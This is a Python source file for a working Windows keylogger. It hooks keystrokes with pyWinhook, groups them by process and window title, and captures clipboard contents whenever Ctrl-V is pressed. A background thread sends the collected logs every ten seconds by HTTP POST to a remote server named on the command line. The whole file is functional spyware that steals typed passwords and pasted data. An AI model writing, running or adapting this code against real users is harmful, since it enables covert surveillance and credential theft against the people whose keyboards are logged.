from ctypes import (
    windll,
    c_ulong,
    create_string_buffer,
    byref
)
from time import sleep
from requests import post
from threading import Thread

import sys
import pythoncom
import pyWinhook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

keylogger_result = {}
current_pid = 0
current_exec_name = ""
current_window_title = ""


def add_info(process_id, executable_name, window_title, key=""):
    global keylogger_result

    # if executable_name does not exist, then we create a new one.
    if(keylogger_result.get(executable_name) == None):
        keylogger_result.update({
            executable_name: {
                window_title : {
                    "process_id": process_id,
                    "keys": key
                }  
            }
        })
    # if it exists..
    elif(keylogger_result.get(executable_name) != None):
        # if there is a window title, then add keys to it.
        if(keylogger_result[executable_name].get(window_title) != None):
            keylogger_result[executable_name].update({
                    window_title : {
                        "process_id": process_id,
                        "keys": keylogger_result[executable_name][window_title]["keys"] + key
                    }                    
                })
        # if there is no window title, we create a new one with empty key.
        else:
            keylogger_result[executable_name].update({
                    window_title : {
                        "process_id": process_id,
                        "keys": key
                    }                    
                })

def sender(host):
    global keylogger_result
    while True:
        sleep(10)
        if(keylogger_result):
            try:
                post(f"http://{host}/add_keylogs", json=keylogger_result)
                keylogger_result = {}
            except:
                pass

def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = str(pid.value)

    # grab the executable
    executable = create_string_buffer(b'\x00' * 512)
    # PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read its title
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # add the window info to keylog result.
    add_info(process_id, executable.value.decode("utf-8", "replace"), window_title.value.decode("utf-8", "replace"))

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    return process_id, executable.value.decode("utf-8", "replace"), window_title.value.decode("utf-8", "replace")

def key_pressed(event):
    global current_window
    global current_pid, current_exec_name, current_window_title
    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        current_pid, current_exec_name, current_window_title = get_current_process()
    # if they pressed a standard key
    if 32 < event.Ascii < 127:
        # add pressed key to the result
        add_info(current_pid, current_exec_name, current_window_title, chr(event.Ascii) + " ")
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            # add pasted content to keylog result
            add_info(current_pid, current_exec_name, current_window_title, f"[PASTE] -> {pasted_value}" + " ")
        else:
            # add special keys to keylog result
            add_info(current_pid, current_exec_name, current_window_title, f"[{event.Key}]"+ " ")

    # print(keylogger_result)
    # pass execution to next hook registered
    return True

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print(f"python {sys.argv[0]} <keylogger_server>")
        print(f"python {sys.argv[0]} 192.168.10.179")
    else:
        # create and register a hook manager
        kl = pyWinhook.HookManager()
        kl.KeyDown = key_pressed
        
        # create sender thread
        t = Thread(target=sender, args=(sys.argv[1],))
        t.start()
        # register the hook and execute forever
        kl.HookKeyboard()
        pythoncom.PumpMessages()
